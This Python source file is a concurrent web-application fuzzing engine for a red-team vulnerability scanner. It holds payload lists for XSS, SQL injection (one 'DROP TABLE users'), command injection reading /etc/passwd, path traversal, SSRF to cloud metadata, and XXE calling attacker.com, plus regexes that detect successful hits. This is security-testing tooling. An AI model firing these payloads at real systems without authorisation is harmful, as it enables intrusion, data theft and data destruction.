#!/usr/bin/env python3
"""
Advanced Fuzzing Engine for Red Team Web Vulnerability Scanner
Developed by: Halil Berkay Şahin
Year: 2025
Purpose: Comprehensive web application fuzzing and input validation testing
"""

import asyncio
import json
import re
import time
from dataclasses import dataclass
from enum import Enum
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import aiohttp
from bs4 import BeautifulSoup


class FuzzType(Enum):
    """Fuzzing types."""

    PARAMETER_FUZZING = "parameter_fuzzing"
    HEADER_FUZZING = "header_fuzzing"
    FORM_FUZZING = "form_fuzzing"
    PATH_FUZZING = "path_fuzzing"
    COOKIE_FUZZING = "cookie_fuzzing"
    JSON_FUZZING = "json_fuzzing"
    XML_FUZZING = "xml_fuzzing"


class VulnerabilityType(Enum):
    """Vulnerability types discovered through fuzzing."""

    XSS = "xss"
    SQL_INJECTION = "sql_injection"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LDAP_INJECTION = "ldap_injection"
    XXE = "xxe"
    SSRF = "ssrf"
    BUFFER_OVERFLOW = "buffer_overflow"
    FORMAT_STRING = "format_string"
    LOGIC_ERROR = "logic_error"


@dataclass
class FuzzPayload:
    """Fuzzing payload information."""

    payload: str
    category: str
    description: str
    expected_response: str = ""
    vulnerability_type: VulnerabilityType = None


@dataclass
class FuzzResult:
    """Individual fuzz test result."""

    url: str
    method: str
    parameter: str
    payload: str
    response_code: int
    response_time: float
    response_length: int
    response_body: str
    headers: dict[str, str]
    vulnerability_detected: bool = False
    vulnerability_type: VulnerabilityType = None
    confidence: str = "LOW"
    error_message: str = ""


@dataclass
class FuzzScanResult:
    """Complete fuzzing scan results."""

    target_url: str
    fuzz_types: list[str]
    total_requests: int
    vulnerabilities_found: int
    scan_duration: float
    results: list[FuzzResult]
    summary: str


class FuzzingEngine:
    """Advanced web application fuzzing engine."""

    def __init__(
        self, timeout: int = 10, concurrent_requests: int = 20, delay: float = 0.1, follow_redirects: bool = True
    ):
        """
        Initialize fuzzing engine.

        Args:
            timeout: Request timeout
            concurrent_requests: Number of concurrent requests
            delay: Delay between requests
            follow_redirects: Whether to follow redirects
        """
        self.timeout = timeout
        self.concurrent_requests = concurrent_requests
        self.delay = delay
        self.follow_redirects = follow_redirects

        # Results storage
        self.fuzz_results: list[FuzzResult] = []

        # Initialize payloads
        self._init_payloads()

        # Session for HTTP requests
        self.session = None

    def _init_payloads(self):
        """Initialize fuzzing payloads."""

        # XSS Payloads
        self.xss_payloads = [
            FuzzPayload(
                "<script>alert('XSS')</script>",
                "basic_xss",
                "Basic script injection",
                vulnerability_type=VulnerabilityType.XSS,
            ),
            FuzzPayload(
                "';alert('XSS');//",
                "javascript_break",
                "JavaScript context break",
                vulnerability_type=VulnerabilityType.XSS,
            ),
            FuzzPayload(
                "\"><script>alert('XSS')</script>",
                "attribute_break",
                "Attribute context break",
                vulnerability_type=VulnerabilityType.XSS,
            ),
            FuzzPayload(
                "javascript:alert('XSS')",
                "javascript_protocol",
                "JavaScript protocol",
                vulnerability_type=VulnerabilityType.XSS,
            ),
            FuzzPayload(
                "<img src=x onerror=alert('XSS')>",
                "img_onerror",
                "Image onerror event",
                vulnerability_type=VulnerabilityType.XSS,
            ),
            FuzzPayload(
                "<svg onload=alert('XSS')>", "svg_onload", "SVG onload event", vulnerability_type=VulnerabilityType.XSS
            ),
            FuzzPayload(
                "'><script>alert(String.fromCharCode(88,83,83))</script>",
                "encoded_xss",
                "Encoded XSS",
                vulnerability_type=VulnerabilityType.XSS,
            ),
        ]

        # SQL Injection Payloads
        self.sqli_payloads = [
            FuzzPayload(
                "' OR '1'='1", "basic_sqli", "Basic SQL injection", vulnerability_type=VulnerabilityType.SQL_INJECTION
            ),
            FuzzPayload(
                "' UNION SELECT NULL--",
                "union_select",
                "Union-based injection",
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
            ),
            FuzzPayload(
                "'; DROP TABLE users; --",
                "destructive_sqli",
                "Destructive SQL injection",
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
            ),
            FuzzPayload(
                "' AND SLEEP(5)--",
                "time_based_sqli",
                "Time-based blind injection",
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
            ),
            FuzzPayload(
                "' OR 1=1#",
                "mysql_comment",
                "MySQL comment injection",
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
            ),
            FuzzPayload(
                "1' AND '1'='1",
                "numeric_sqli",
                "Numeric SQL injection",
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
            ),
            FuzzPayload(
                "admin'--",
                "admin_bypass",
                "Admin authentication bypass",
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
            ),
        ]

        # Command Injection Payloads
        self.cmd_payloads = [
            FuzzPayload(
                "; whoami",
                "basic_cmd",
                "Basic command injection",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
            ),
            FuzzPayload(
                "| whoami", "pipe_cmd", "Pipe command injection", vulnerability_type=VulnerabilityType.COMMAND_INJECTION
            ),
            FuzzPayload(
                "& whoami",
                "ampersand_cmd",
                "Ampersand command injection",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
            ),
            FuzzPayload(
                "`whoami`",
                "backtick_cmd",
                "Backtick command injection",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
            ),
            FuzzPayload(
                "$(whoami)",
                "dollar_cmd",
                "Dollar parentheses injection",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
            ),
            FuzzPayload(
                "; cat /etc/passwd",
                "file_read",
                "File reading injection",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
            ),
            FuzzPayload(
                "; ping -c 3 127.0.0.1",
                "network_cmd",
                "Network command injection",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
            ),
        ]

        # Path Traversal Payloads
        self.traversal_payloads = [
            FuzzPayload(
                "../../../etc/passwd",
                "linux_traversal",
                "Linux path traversal",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
            ),
            FuzzPayload(
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "windows_traversal",
                "Windows path traversal",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
            ),
            FuzzPayload(
                "....//....//....//etc/passwd",
                "double_encoding",
                "Double encoding traversal",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
            ),
            FuzzPayload(
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "url_encoded",
                "URL encoded traversal",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
            ),
            FuzzPayload(
                "..%252f..%252f..%252fetc%252fpasswd",
                "double_url_encoded",
                "Double URL encoded",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
            ),
        ]

        # LDAP Injection Payloads
        self.ldap_payloads = [
            FuzzPayload(
                "*)(uid=*))(|(uid=*",
                "ldap_wildcard",
                "LDAP wildcard injection",
                vulnerability_type=VulnerabilityType.LDAP_INJECTION,
            ),
            FuzzPayload(
                "admin)(&(password=*))",
                "ldap_bypass",
                "LDAP authentication bypass",
                vulnerability_type=VulnerabilityType.LDAP_INJECTION,
            ),
            FuzzPayload(
                "*)(|(objectClass=*",
                "ldap_enum",
                "LDAP enumeration",
                vulnerability_type=VulnerabilityType.LDAP_INJECTION,
            ),
        ]

        # SSRF Payloads
        self.ssrf_payloads = [
            FuzzPayload(
                "http://localhost:22",
                "localhost_port",
                "Localhost port scan",
                vulnerability_type=VulnerabilityType.SSRF,
            ),
            FuzzPayload(
                "http://127.0.0.1:80",
                "loopback_http",
                "Loopback HTTP access",
                vulnerability_type=VulnerabilityType.SSRF,
            ),
            FuzzPayload(
                "file:///etc/passwd", "file_protocol", "File protocol access", vulnerability_type=VulnerabilityType.SSRF
            ),
            FuzzPayload(
                "http://169.254.169.254/latest/meta-data/",
                "aws_metadata",
                "AWS metadata access",
                vulnerability_type=VulnerabilityType.SSRF,
            ),
            FuzzPayload(
                "gopher://127.0.0.1:25/_HELO",
                "gopher_protocol",
                "Gopher protocol injection",
                vulnerability_type=VulnerabilityType.SSRF,
            ),
        ]

        # XXE Payloads
        self.xxe_payloads = [
            FuzzPayload(
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
                "xxe_file",
                "XXE file reading",
                vulnerability_type=VulnerabilityType.XXE,
            ),
            FuzzPayload(
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><data>&xxe;</data>',
                "xxe_external",
                "XXE external entity",
                vulnerability_type=VulnerabilityType.XXE,
            ),
        ]

        # Buffer Overflow Payloads
        self.buffer_payloads = [
            FuzzPayload(
                "A" * 1000, "buffer_1000", "1000 character buffer", vulnerability_type=VulnerabilityType.BUFFER_OVERFLOW
            ),
            FuzzPayload(
                "A" * 5000, "buffer_5000", "5000 character buffer", vulnerability_type=VulnerabilityType.BUFFER_OVERFLOW
            ),
            FuzzPayload(
                "A" * 10000,
                "buffer_10000",
                "10000 character buffer",
                vulnerability_type=VulnerabilityType.BUFFER_OVERFLOW,
            ),
        ]

        # Format String Payloads
        self.format_payloads = [
            FuzzPayload(
                "%x%x%x%x",
                "format_hex",
                "Hexadecimal format string",
                vulnerability_type=VulnerabilityType.FORMAT_STRING,
            ),
            FuzzPayload(
                "%s%s%s%s",
                "format_string",
                "String format vulnerability",
                vulnerability_type=VulnerabilityType.FORMAT_STRING,
            ),
            FuzzPayload(
                "%n%n%n%n", "format_write", "Format string write", vulnerability_type=VulnerabilityType.FORMAT_STRING
            ),
        ]

        # Special characters for input validation testing
        self.special_chars = [
            "'",
            '"',
            "<",
            ">",
            "&",
            ";",
            "|",
            "`",
            "$",
            "(",
            ")",
            "[",
            "]",
            "{",
            "}",
            "%",
            "#",
            "@",
            "!",
            "~",
            "^",
            "*",
            "+",
            "=",
            "\\",
            "/",
            "?",
            ":",
            "\x00",
            "\x0a",
            "\x0d",
            "\x1a",
            "\x08",
            "\x09",
        ]

        # Error patterns for vulnerability detection
        self.error_patterns = {
            VulnerabilityType.SQL_INJECTION: [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"valid MySQL result",
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_.*",
                r"valid PostgreSQL result",
                r"Microsoft Access Driver",
                r"JET Database Engine",
                r"OLE DB Provider for ODBC",
                r"Oracle error",
                r"Oracle.*ORA-\d+",
                r"SQL Server",
            ],
            VulnerabilityType.XSS: [
                r"<script[^>]*>.*?</script>",
                r"javascript:",
                r"alert\s*\(",
                r"confirm\s*\(",
                r"prompt\s*\(",
                r"document\.cookie",
                r"window\.location",
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                r"root:x:0:0:",
                r"daemon:x:1:1:",
                r"bin:x:2:2:",
                r"sys:x:3:3:",
                r"# Copyright.*Microsoft Corp",
                r"127\.0\.0\.1.*localhost",
                r"uid=\d+.*gid=\d+",
                r"Microsoft Windows",
                r"Volume Serial Number",
            ],
            VulnerabilityType.PATH_TRAVERSAL: [
                r"root:x:0:0:",
                r"\[boot loader\]",
                r"# Copyright.*Microsoft Corp",
                r"127\.0\.0\.1.*localhost",
            ],
        }

    async def fuzz_target(self, url: str, fuzz_types: list[str] = None) -> FuzzScanResult:
        """
        Perform comprehensive fuzzing on target.

        Args:
            url: Target URL
            fuzz_types: List of fuzzing types to perform

        Returns:
            FuzzScanResult with discovered vulnerabilities
        """
        print(f"🔍 Starting fuzzing scan on {url}")
        start_time = time.time()

        if fuzz_types is None:
            fuzz_types = ["parameter_fuzzing", "header_fuzzing", "form_fuzzing"]

        self.fuzz_results.clear()

        # Initialize session
        connector = aiohttp.TCPConnector(limit=self.concurrent_requests)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

        try:
            # Execute fuzzing types
            for fuzz_type in fuzz_types:
                print(f"🎯 Performing {fuzz_type}")

                if fuzz_type == "parameter_fuzzing":
                    await self._fuzz_parameters(url)
                elif fuzz_type == "header_fuzzing":
                    await self._fuzz_headers(url)
                elif fuzz_type == "form_fuzzing":
                    await self._fuzz_forms(url)
                elif fuzz_type == "path_fuzzing":
                    await self._fuzz_paths(url)
                elif fuzz_type == "cookie_fuzzing":
                    await self._fuzz_cookies(url)
                elif fuzz_type == "json_fuzzing":
                    await self._fuzz_json(url)

            await self.session.close()

            scan_duration = time.time() - start_time
            vulnerabilities = [r for r in self.fuzz_results if r.vulnerability_detected]

            result = FuzzScanResult(
                target_url=url,
                fuzz_types=fuzz_types,
                total_requests=len(self.fuzz_results),
                vulnerabilities_found=len(vulnerabilities),
                scan_duration=scan_duration,
                results=self.fuzz_results,
                summary=f"Completed {len(self.fuzz_results)} fuzz tests, found {len(vulnerabilities)} vulnerabilities in {scan_duration:.2f}s",
            )

            print("✅ Fuzzing completed!")
            print(f"📊 Total requests: {len(self.fuzz_results)}")
            print(f"🚨 Vulnerabilities found: {len(vulnerabilities)}")

            return result

        except Exception as e:
            print(f"❌ Fuzzing error: {e}")
            if self.session:
                await self.session.close()

            return FuzzScanResult(
                target_url=url,
                fuzz_types=fuzz_types,
                total_requests=0,
                vulnerabilities_found=0,
                scan_duration=time.time() - start_time,
                results=[],
                summary=f"Fuzzing failed: {e}",
            )

    async def _fuzz_parameters(self, url: str):
        """Fuzz URL parameters."""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        if not params:
            # Add test parameters if none exist
            params = {"id": ["1"], "page": ["1"], "search": ["test"]}

        # Combine all payload types
        all_payloads = (
            self.xss_payloads
            + self.sqli_payloads
            + self.cmd_payloads
            + self.traversal_payloads
            + self.ssrf_payloads
            + self.ldap_payloads
        )

        semaphore = asyncio.Semaphore(self.concurrent_requests)

        async def fuzz_param(param_name: str, payload: FuzzPayload):
            async with semaphore:
                await self._test_parameter(url, param_name, payload)
                await asyncio.sleep(self.delay)

        # Create tasks for all parameter/payload combinations
        tasks = []
        for param_name in params.keys():
            for payload in all_payloads:
                tasks.append(fuzz_param(param_name, payload))

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _fuzz_headers(self, url: str):
        """Fuzz HTTP headers."""
        # Common headers to fuzz
        headers_to_fuzz = [
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Originating-IP",
            "X-Remote-IP",
            "X-Forwarded-Host",
            "Authorization",
            "Cookie",
            "Accept",
            "Accept-Language",
        ]

        # Header-specific payloads
        header_payloads = self.xss_payloads + self.cmd_payloads + self.traversal_payloads

        semaphore = asyncio.Semaphore(self.concurrent_requests)

        async def fuzz_header(header_name: str, payload: FuzzPayload):
            async with semaphore:
                await self._test_header(url, header_name, payload)
                await asyncio.sleep(self.delay)

        tasks = []
        for header_name in headers_to_fuzz:
            for payload in header_payloads:
                tasks.append(fuzz_header(header_name, payload))

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _fuzz_forms(self, url: str):
        """Discover and fuzz forms."""
        try:
            # Get page content
            async with self.session.get(url) as response:
                html_content = await response.text()

            # Parse forms
            soup = BeautifulSoup(html_content, "html.parser")
            forms = soup.find_all("form")

            for form in forms:
                await self._fuzz_single_form(url, form)

        except Exception as e:
            print(f"❌ Form fuzzing error: {e}")

    async def _fuzz_single_form(self, base_url: str, form):
        """Fuzz a single form."""
        try:
            # Get form details
            action = form.get("action", "")
            method = form.get("method", "get").lower()

            # Resolve form action URL
            if action.startswith("http"):
                form_url = action
            elif action.startswith("/"):
                parsed_base = urlparse(base_url)
                form_url = f"{parsed_base.scheme}://{parsed_base.netloc}{action}"
            else:
                form_url = f"{base_url.rstrip('/')}/{action}" if action else base_url

            # Get form inputs
            inputs = form.find_all(["input", "textarea", "select"])
            form_data = {}

            for input_tag in inputs:
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")

                if input_name and input_type not in ["submit", "button", "reset"]:
                    form_data[input_name] = "test"

            if not form_data:
                return

            # Test each form field with payloads
            all_payloads = self.xss_payloads + self.sqli_payloads + self.cmd_payloads

            semaphore = asyncio.Semaphore(self.concurrent_requests)

            async def fuzz_form_field(field_name: str, payload: FuzzPayload):
                async with semaphore:
                    await self._test_form_field(form_url, method, form_data, field_name, payload)
                    await asyncio.sleep(self.delay)

            tasks = []
            for field_name in form_data.keys():
                for payload in all_payloads:
                    tasks.append(fuzz_form_field(field_name, payload))

            await asyncio.gather(*tasks, return_exceptions=True)

        except Exception as e:
            print(f"❌ Single form fuzzing error: {e}")

    async def _fuzz_paths(self, url: str):
        """Fuzz URL paths."""
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        # Path fuzzing payloads
        path_payloads = self.traversal_payloads + [
            FuzzPayload("admin", "admin_path", "Admin path"),
            FuzzPayload("config", "config_path", "Config path"),
            FuzzPayload("backup", "backup_path", "Backup path"),
            FuzzPayload("test", "test_path", "Test path"),
            FuzzPayload("dev", "dev_path", "Development path"),
        ]

        semaphore = asyncio.Semaphore(self.concurrent_requests)

        async def fuzz_path(payload: FuzzPayload):
            async with semaphore:
                test_url = f"{base_url}/{payload.payload}"
                await self._test_url(test_url, "GET", payload, "path")
                await asyncio.sleep(self.delay)

        tasks = [fuzz_path(payload) for payload in path_payloads]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _fuzz_cookies(self, url: str):
        """Fuzz cookies."""
        # Common cookie names to test
        cookie_names = ["sessionid", "auth", "token", "user", "admin", "login"]
        cookie_payloads = self.xss_payloads + self.sqli_payloads

        semaphore = asyncio.Semaphore(self.concurrent_requests)

        async def fuzz_cookie(cookie_name: str, payload: FuzzPayload):
            async with semaphore:
                cookies = {cookie_name: payload.payload}
                await self._test_request(url, "GET", payload, "cookie", cookies=cookies)
                await asyncio.sleep(self.delay)

        tasks = []
        for cookie_name in cookie_names:
            for payload in cookie_payloads:
                tasks.append(fuzz_cookie(cookie_name, payload))

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _fuzz_json(self, url: str):
        """Fuzz JSON endpoints."""
        json_payloads = self.xss_payloads + self.sqli_payloads + self.xxe_payloads

        # Common JSON structures to test
        json_structures = [
            {"id": "PAYLOAD"},
            {"user": "PAYLOAD"},
            {"search": "PAYLOAD"},
            {"data": {"value": "PAYLOAD"}},
            {"items": ["PAYLOAD"]},
        ]

        semaphore = asyncio.Semaphore(self.concurrent_requests)

        async def fuzz_json_payload(structure: dict, payload: FuzzPayload):
            async with semaphore:
                # Replace PAYLOAD in structure
                json_data = json.dumps(structure).replace("PAYLOAD", payload.payload)
                headers = {"Content-Type": "application/json"}
                await self._test_request(url, "POST", payload, "json", data=json_data, headers=headers)
                await asyncio.sleep(self.delay)

        tasks = []
        for structure in json_structures:
            for payload in json_payloads:
                tasks.append(fuzz_json_payload(structure, payload))

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_parameter(self, url: str, param_name: str, payload: FuzzPayload):
        """Test parameter with payload."""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param_name] = [payload.payload]

        # Rebuild URL with modified parameter
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(
            (parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment)
        )

        await self._test_request(new_url, "GET", payload, param_name)

    async def _test_header(self, url: str, header_name: str, payload: FuzzPayload):
        """Test header with payload."""
        headers = {header_name: payload.payload}
        await self._test_request(url, "GET", payload, header_name, headers=headers)

    async def _test_form_field(self, url: str, method: str, form_data: dict, field_name: str, payload: FuzzPayload):
        """Test form field with payload."""
        test_data = form_data.copy()
        test_data[field_name] = payload.payload

        if method.lower() == "post":
            await self._test_request(url, "POST", payload, field_name, data=test_data)
        else:
            params = urlencode(test_data)
            test_url = f"{url}?{params}"
            await self._test_request(test_url, "GET", payload, field_name)

    async def _test_url(self, url: str, method: str, payload: FuzzPayload, context: str):
        """Test URL directly."""
        await self._test_request(url, method, payload, context)

    async def _test_request(self, url: str, method: str, payload: FuzzPayload, context: str, **kwargs):
        """Execute test request and analyze response."""
        try:
            start_time = time.time()

            async with self.session.request(method, url, **kwargs) as response:
                response_time = time.time() - start_time
                response_body = await response.text()

                result = FuzzResult(
                    url=url,
                    method=method,
                    parameter=context,
                    payload=payload.payload,
                    response_code=response.status,
                    response_time=response_time,
                    response_length=len(response_body),
                    response_body=response_body[:1000],  # Limit body size
                    headers=dict(response.headers),
                )

                # Analyze response for vulnerabilities
                self._analyze_response(result, payload)
                self.fuzz_results.append(result)

        except Exception as e:
            error_result = FuzzResult(
                url=url,
                method=method,
                parameter=context,
                payload=payload.payload,
                response_code=0,
                response_time=0,
                response_length=0,
                response_body="",
                headers={},
                error_message=str(e),
            )
            self.fuzz_results.append(error_result)

    def _analyze_response(self, result: FuzzResult, payload: FuzzPayload):
        """Analyze response for vulnerability indicators."""
        response_text = result.response_body.lower()

        # Check for error patterns
        if payload.vulnerability_type in self.error_patterns:
            patterns = self.error_patterns[payload.vulnerability_type]
            for pattern in patterns:
                if re.search(pattern, result.response_body, re.IGNORECASE):
                    result.vulnerability_detected = True
                    result.vulnerability_type = payload.vulnerability_type
                    result.confidence = "HIGH"
                    return

        # Check for reflected payload
        if payload.payload.lower() in response_text:
            result.vulnerability_detected = True
            result.vulnerability_type = payload.vulnerability_type
            result.confidence = "MEDIUM"
            return

        # Check for unusual response codes
        if result.response_code in [500, 502, 503]:
            result.vulnerability_detected = True
            result.vulnerability_type = VulnerabilityType.LOGIC_ERROR
            result.confidence = "LOW"
            return

        # Check for unusual response times (potential time-based attacks)
        if result.response_time > 5.0 and "sleep" in payload.payload.lower():
            result.vulnerability_detected = True
            result.vulnerability_type = VulnerabilityType.SQL_INJECTION
            result.confidence = "MEDIUM"
            return

    def generate_report(self, result: FuzzScanResult) -> str:
        """Generate detailed fuzzing report."""
        report = []
        report.append("=" * 80)
        report.append("🎯 FUZZING SCAN REPORT")
        report.append("=" * 80)
        report.append("")

        report.append(f"🎯 Target URL: {result.target_url}")
        report.append(f"🔍 Fuzz Types: {', '.join(result.fuzz_types)}")
        report.append(f"📊 Total Requests: {result.total_requests}")
        report.append(f"🚨 Vulnerabilities: {result.vulnerabilities_found}")
        report.append(f"⏱️  Scan Duration: {result.scan_duration:.2f}s")
        report.append("")

        # Group vulnerabilities by type
        vulnerabilities = [r for r in result.results if r.vulnerability_detected]
        if vulnerabilities:
            vuln_types = {}
            for vuln in vulnerabilities:
                vuln_type = vuln.vulnerability_type.value if vuln.vulnerability_type else "unknown"
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(vuln)

            for vuln_type, vulns in vuln_types.items():
                report.append(f"🚨 {vuln_type.upper()} ({len(vulns)} found):")
                for vuln in vulns[:5]:  # Show first 5 of each type
                    report.append(f"   Parameter: {vuln.parameter}")
                    report.append(f"   Payload: {vuln.payload[:50]}...")
                    report.append(f"   Response Code: {vuln.response_code}")
                    report.append(f"   Confidence: {vuln.confidence}")
                    report.append("")
        else:
            report.append("✅ No vulnerabilities detected")

        return "\n".join(report)


# Convenience functions
async def quick_parameter_fuzz(url: str) -> FuzzScanResult:
    """Quick parameter fuzzing."""
    engine = FuzzingEngine()
    return await engine.fuzz_target(url, ["parameter_fuzzing"])


async def comprehensive_fuzz(url: str) -> FuzzScanResult:
    """Comprehensive fuzzing with all types."""
    engine = FuzzingEngine()
    fuzz_types = [
        "parameter_fuzzing",
        "header_fuzzing",
        "form_fuzzing",
        "path_fuzzing",
        "cookie_fuzzing",
        "json_fuzzing",
    ]
    return await engine.fuzz_target(url, fuzz_types)


if __name__ == "__main__":
    # Test fuzzing engine
    async def test_fuzzing():
        engine = FuzzingEngine()
        target = "https://httpbin.org/get?test=value"

        print(f"🎯 Testing fuzzing engine on {target}")
        result = await engine.fuzz_target(target, ["parameter_fuzzing"])

        print(f"Total requests: {result.total_requests}")
        print(f"Vulnerabilities found: {result.vulnerabilities_found}")

    asyncio.run(test_fuzzing())
